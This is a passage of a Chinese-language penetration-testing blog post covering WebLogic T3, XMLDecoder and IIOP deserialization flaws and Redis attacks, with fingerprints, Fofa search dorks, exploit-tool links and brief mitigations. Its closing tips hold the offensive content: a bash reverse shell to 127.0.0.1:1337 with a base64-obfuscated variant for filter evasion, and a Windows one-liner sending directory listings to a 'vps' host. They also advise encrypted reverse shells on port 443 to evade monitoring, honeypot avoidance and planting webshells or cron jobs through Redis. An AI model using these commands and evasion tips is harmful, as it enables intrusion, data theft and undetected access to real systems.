<p>CVE-2018-2893<br><a href="https://www.freebuf.com/vuls/178105.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/178105.html</a></p>
<p>CVE-2019-2890<br><a href="https://paper.seebug.org/1069/" target="_blank" rel="noopener">https://paper.seebug.org/1069/</a></p>
<p>CVE-2020-2555(Oracle Coherence)<br><a href="https://paper.seebug.org/1141/" target="_blank" rel="noopener">https://paper.seebug.org/1141/</a></p>
<p>除此之外, 还有最近Oracle 2020年4月安全通告中的CVE-2020-2801, CVE-2020-2883, CVE-2020-2884, CVE-2020-2915(Oracle Coherence)等漏洞.<br><a href="https://www.oracle.com/security-alerts/cpuapr2020.html" target="_blank" rel="noopener">https://www.oracle.com/security-alerts/cpuapr2020.html</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>weblogic 漏洞扫描工具<br><a href="https://github.com/0xn0ne/weblogicScanner" target="_blank" rel="noopener">https://github.com/0xn0ne/weblogicScanner</a></p>
<p>CVE-2020-2555<br><a href="https://github.com/Y4er/CVE-2020-2555" target="_blank" rel="noopener">https://github.com/Y4er/CVE-2020-2555</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.T3 协议通常开放在内网, 外网基本绝迹, 快速检测可以使用nmap</p>
<pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sV --script=weblogic-t3-<span class="hljs-literal">info</span>.nse -p <span class="hljs-number">7001</span></code></pre>

<p>2.内网使用最新的利用链即可, weblogic也支持TLS加密的t3s, 可以使用</p>
<p>Bort-Millipede/WLT3Serial: Native Java-based deserialization exploit for WebLogic T3 (and T3S) listeners.<br><a href="https://github.com/Bort-Millipede/WLT3Serial" target="_blank" rel="noopener">https://github.com/Bort-Millipede/WLT3Serial</a></p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁<br>2.禁用T3协议<br>3.禁止T3端口对外开放, 或者限制可访问T3端口的IP来源</p>
<h2 id="Weblogic-XMLDecoder反序列化"><a href="#Weblogic-XMLDecoder反序列化" class="headerlink" title="Weblogic XMLDecoder反序列化"></a>Weblogic XMLDecoder反序列化</h2><p><strong>1. 漏洞简介</strong></p>
<p>2017年4月Oacle官方安全通告, 包含了对与CVE编号CVE-2017-3506的修复补丁, wls-wsat这个提供的web service服务中, 处理xml数据的的时候, XMLDecoder的反序列化漏洞风险, 同年10月份的补丁中的则是对其绕过的修复, CVE编号为CVE-2017-10271.</p>
<p>2019年4月17日, CNVD 发布《关于Oracle WebLogic wls9-async组件存在反序列化远程命令执行漏洞的安全公告》, 部分版本WebLogic中默认包含的wls9_async_response包, 为WebLogic Server提供异步通讯服务.由于该WAR包在反序列化处理输入信息时存在缺陷, 攻击者可以发送精心构造的恶意 HTTP 请求, 获得目标服务器的权限, 在未授权的情况下远程执行命令.</p>
<p><strong>2. 影响组件</strong></p>
<p>WebLogic 10.X</p>
<p>WebLogic 12.1.3</p>
<p><strong>3. 漏洞指纹</strong></p>
<pre><code class="hljs autohotkey">/wls-wsat/CoordinatorPortType`
`/_async/AsyncResponseService`
`/_async/AsyncResponseServiceSoap12</code></pre>

<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"WebLogic-Server"</span></code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>（CVE-2017-3506 &amp;CVE-2017-10271）<br>[<a href="http://xxlegend.com/2017/12/23/Weblogic%20XMLDecoder%20RCE%E5%88%86%E6%9E%90/]" target="_blank" rel="noopener">http://xxlegend.com/2017/12/23/Weblogic%20XMLDecoder%20RCE%E5%88%86%E6%9E%90/]</a>(<a href="http://xxlegend.com/2017/12/23/Weblogic" target="_blank" rel="noopener">http://xxlegend.com/2017/12/23/Weblogic</a> XMLDecoder RCE分析/)</p>
<p>CVE-2019-2725<br><a href="https://paper.seebug.org/909/" target="_blank" rel="noopener">https://paper.seebug.org/909/</a></p>
<p><strong>6. 漏洞利用</strong><br>weblogicScanner<br><a href="https://github.com/0xn0ne/weblogicScanner" target="_blank" rel="noopener">https://github.com/0xn0ne/weblogicScanner</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.由于nginx转发问题, 尝试这种路径, 可能有惊喜</p>
<pre><code class="hljs autohotkey">/../wls-wsat/CoordinatorPortType11`
`/../_async/AsyncResponseService</code></pre>

<p>2.Weblogic 写shell有个技巧</p>
<p>可以通过<code>find</code>/<code>grep</code>命令查找静态文件的路径, 然后将命令结果输出到静态文件夹中, 比如查找前台的<code>logo.png</code> / <code>/static/css/main.css</code></p>
<p><strong>8. 防护方法</strong></p>
<p>1.通过访问策略控制禁止外部/_async/* 及 /wls-wsat/*路径的URL访问；</p>
<p>2.删除对应war包并重启 webLogic；</p>
<p>3.限制源IP对应 weblogic 7001端口的访问.</p>
<h2 id="Weblogic-IIOP"><a href="#Weblogic-IIOP" class="headerlink" title="Weblogic IIOP"></a>Weblogic IIOP</h2><p><strong>1. 漏洞简介</strong></p>
<p>2017年4月Oacle官方安全通告中, 包含了对与CVE编号CVE-2020-2551的补丁, 未经身份验证的攻击者可以通过IIOP对Oracle WebLogic Server进行攻击, 造成远程代码执行.</p>
<p><strong>2. 影响组件</strong></p>
<p>Oracle WebLogic Server version:</p>
<p>10.3.6.0.0</p>
<p>12.1.3.0.0</p>
<p>12.2.1.3.0 and 12.2.1.4.0</p>
<p><strong>3. 漏洞指纹</strong></p>
<pre><code class="hljs css"><span class="hljs-selector-tag">GIOP</span> &amp;&amp; <span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.bea</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.repackaged</span><span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.transaction</span><span class="hljs-selector-class">.jta</span><span class="hljs-selector-class">.JtaTransactionManager</span></code></pre>

<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"WebLogic-Server"</span></code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>WebLogic CVE-2020-2551漏洞分析<br><a href="https://paper.seebug.org/1138/" target="_blank" rel="noopener">https://paper.seebug.org/1138/</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>Y4er/CVE-2020-2551: Weblogic IIOP CVE-2020-2551<br><a href="https://github.com/Y4er/CVE-2020-2551" target="_blank" rel="noopener">https://github.com/Y4er/CVE-2020-2551</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>漫谈WebLogic CVE-2020-2551 – 安全客，安全资讯平台<br><a href="https://www.anquanke.com/post/id/201005" target="_blank" rel="noopener">https://www.anquanke.com/post/id/201005</a></p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.通过 Weblogic 控制台进行关闭 IIOP 协议</p>
<h2 id="Redis-相关漏洞"><a href="#Redis-相关漏洞" class="headerlink" title="Redis 相关漏洞"></a>Redis 相关漏洞</h2><p><strong>1. 漏洞简介</strong></p>
<p>Redis 在近几年也是攻击的重点, 早期Redis默认没有密码, 且经常开放到公网, Redis可以进行文件写入, 以及后面的主从复制远程代码执行漏洞, 或者配合缓存序列化数据进行操作</p>
<p><strong>2. 影响组件</strong></p>
<p>Redis</p>
<p><strong>3. 漏洞指纹</strong></p>
<pre><code class="hljs angelscript"><span class="hljs-number">6379</span></code></pre>

<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Redis"</span> &amp;&amp; <span class="hljs-string">"redis_version"</span></code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>Redis 基于主从复制的 RCE 利用方式<br><a href="https://paper.seebug.org/975/" target="_blank" rel="noopener">https://paper.seebug.org/975/</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>n0b0dyCN/RedisModules-ExecuteCommand: Tools, utilities and scripts to help you write redis modules!<br><a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand" target="_blank" rel="noopener">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.当Redis 权限满足写文件时</p>
<p>linux 写计划任务, windows写启动目录, 如果可以都写web目录的webshell</p>
<p>2.当Redis 权限不满足写文件时</p>
<p>发现Redis记录中存在JSON串的时候, 可以尝试写入Fastjson或Jackson的反序列化漏洞</p>
<p>发现Redis记录中存在<code>AC ED</code>这种反序列化特征的时候, 可以尝试写入ysoserial产生的序列化数据</p>
<p><strong>8. 防护方法</strong></p>
<p>1.Redis 设置强口令</p>
<p>2.Redis 尽量不要开放到公网</p>
<p>3.限制来源IP</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>1.记得躲避蜜罐, 现在身份识别蜜罐基本都是使用jsonp进行互联网身份识别, 随便抽一个蜜罐, 公网大概一百多台</p>
<p>搜索结果 – FOFA网络空间测绘系统<br><a href="https://fofa.so/result?q=" target="_blank" rel="noopener" var+jtoken%3d'"&qbase64="InZhciBqdG9rZW49JyI%3D&quot;">https://fofa.so/result?q=%22var+jtoken%3D%27%22&amp;qbase64=InZhciBqdG9rZW49JyI%3D</a></p>
<p>2.反弹shell 可以使用openssl反弹443端口, 现在厂商一般都有流量监控设备, 直接明文传输会被审查到</p>
<p>Reverse shell cheatsheet 多种反弹shell的命令<br><a href="https://krober.biz/misc/reverse_shell.php" target="_blank" rel="noopener">https://krober.biz/misc/reverse_shell.php</a></p>
<p>3.很多时候执行命令不能有特殊符号, 比如尖角号之类的, 可以使用 base64进行传参</p>
<pre><code class="hljs angelscript">bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/<span class="hljs-number">1337</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span></code></pre>

<p>base64 可以转换成</p>
<pre><code class="hljs plain">YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTMzNyAwPiYx</code></pre>

<p>最终可以变成</p>
<pre><code class="hljs dust"><span class="xml">bash -c "</span><span class="hljs-template-variable">{echo, YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTMzNyAwPiYx}</span><span class="xml">|</span><span class="hljs-template-variable">{base64, -d}</span><span class="xml">|</span><span class="hljs-template-variable">{bash, -i}</span><span class="xml">"</span></code></pre>

<p>4.windows机器可以使用ie浏览器带数据出来, 很多杀软不会拦截ie浏览器, unc 传输文件也可以</p>
<pre><code class="hljs ruby"><span class="hljs-keyword">for</span> /f %s <span class="hljs-keyword">in</span> (<span class="hljs-string">'dir c:\ /b'</span>) <span class="hljs-keyword">do</span> explorer <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/vps:8000/</span><span class="hljs-string">?%</span>s
\\vps\share\shell.bat</code></pre>

<p>5.针对很多时候java类漏洞, 比如反序列化, rmi, jmx, iiop等情况, 时常会遇到timeout的情况</p>
<p>这里主要是没有指定<code>hostname</code>, 这里可以使用<code>socat</code>进行流量转发, 无需修改POC, 以<code>CVE-2019-12409</code>为例</p>
<blockquote>
<p>这里针对 ENABLE_REMOTE_JMX_OPTS 远程代码执行(CVE-2019-12409) 多说一点, 因为这个问题在所有的jmx连接中都有可能出现<br>这里存在一个问题, JMX Server如果在启动时没有指明hostname, 那么在客户端与服务器交互过程中, 有一步返回 stub rmiserver的过程, 其中地址可能为内网地址<br>通过查看报错, 可以得知内网地址, 例如 172.18.0.2<br>使用如下两条命令即可执行, 替换 <code>[报错中的ip]</code>, <code>[远程目标的ip]</code></p>
</blockquote>
<pre><code class="hljs armasm"><span class="hljs-symbol">ip</span> <span class="hljs-keyword">addr </span><span class="hljs-keyword">add </span>[报错中的<span class="hljs-built_in">ip</span>]/<span class="hljs-number">24</span> dev lo
<span class="hljs-symbol">socat</span> tcp4-listen:<span class="hljs-number">18983</span>, <span class="hljs-keyword">bind=[报错中的ip], </span>reuseaddr, fork tcp4-connect:[远程目标的<span class="hljs-built_in">ip</span>]:<span class="hljs-number">18983</span></code></pre>

<p>6.Java 反序列化是这两年的重中之重, 如果有shell出不来可以参考以下链接</p>
<p>深入理解JAVA反序列化漏洞 | 漏洞盒子 | 互联网安全测试众测平台<br><a href="https://www.vulbox.com/knowledge/detail/?id=11" target="_blank" rel="noopener">https://www.vulbox.com/knowledge/detail/?id=11</a></p>
<p>tomcat不出网回显连续剧第六集 – 先知社区<br><a href="https://xz.aliyun.com/t/7535" target="_blank" rel="noopener">https://xz.aliyun.com/t/7535</a></p>
<p>Weblogic T3/iiop 构造有回显exp方案分析 – 先知社区<br><a href="https://xz.aliyun.com/t/7489" target="_blank" rel="noopener">https://xz.aliyun.com/t/7489</a></p>
<p>weblogic IIOP漏洞的回显构造研究 – 先知社区<br><a href="https://xz.aliyun.com/t/7393" target="_blank" rel="noopener">https://xz.aliyun.com/t/7393</a></p>
<p>linux下java反序列化通杀回显方法的低配版实现 – 先知社区<br><a href="https://xz.aliyun.com/t/7307" target="_blank" rel="noopener">https://xz.aliyun.com/t/7307</a></p>
<p>照弹不误:出站端口受限环境下反弹Shell的思考 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/vuls/232544.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/232544.html</a></p>
<p>如何绕过高版本JDK限制进行JNDI注入利用<br><a href="https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA</a></p>
<p>JosephTribbianni/JNDI: JNDI 注入利用工具<br><a href="https://github.com/JosephTribbianni/JNDI" target="_blank" rel="noopener">https://github.com/JosephTribbianni/JNDI</a></p>
<p>7.永远相信弱口令的力量, 文中没有提到的 mysql, mssql, rdp, ssh, docker-api, 大数据平台相关组件或者更多常见不常见服务, 很多都是弱口令/未授权一把梭的问题<br>最后祝大家 <strong>开局有0day, 处处弱口令</strong></p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>
            </article>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">漏洞利用</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">漏洞利用</a>
                    
                  </div>
                
              </div>
              
              
                <div class="post-prevnext row">
                  <div class="post-prev col-6">
                    
                    
                      <a href="/2020/07/08/asd/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">asd</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </div>
                  <div class="post-next col-6">
                    
                    
                      <a href="/2020/07/08/hello-world/">
                        <span class="hidden-mobile">hello-world</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </div>
                </div>
              
            </div>

            
          </div>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
      <i class="iconfont icon-love"></i>
      <!-- <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
        <span>Fluid</span></a> -->
    </div>
    

    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/main.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
  <script  src="/js/clipboard-use.js" ></script>







  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: 'article.markdown-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "斗象科技-武器库&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>




















</body>
</html>
